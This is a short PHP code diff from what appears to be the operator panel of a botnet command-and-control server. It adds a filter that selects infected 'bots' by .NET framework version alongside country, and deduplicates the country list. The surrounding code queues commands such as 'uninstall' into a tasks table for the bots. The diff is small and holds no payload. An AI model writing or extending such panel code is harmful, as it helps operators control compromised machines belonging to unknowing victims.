@@ -191,6 +191,9 @@ class Main{
                 if(!empty($_POST["country-filter"])){
                     $filter["country"] = implode(', ', $_POST['country-filter']);
                 }
+                if(!empty($_POST["netFramwork-filter"])){
+                    $filter["netFramwork"] = implode(', ', $_POST['netFramwork-filter']);
+                }
                 if($_POST["task"] == "uninstall") {
                     $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, command, task) VALUES (?, ?, ?, ?)");
                     $statement->execute(array(json_encode($filter), 1, 'uninstall', $_POST["task"]));
@@ -219,9 +222,11 @@ class Main{
                $allTasks[] = $row;
             }
             $countries = array();
-            foreach ($GLOBALS["pdo"]->query("SELECT country FROM bots") as $row) {
+            foreach ($GLOBALS["pdo"]->query("SELECT country FROM bots group by country") as $row) {
                 $countries[] = $row["country"];
             }
+
+
 
             if($botid != ""){
                 $GLOBALS["tpl"]->assign("showCountryFilter", "false");
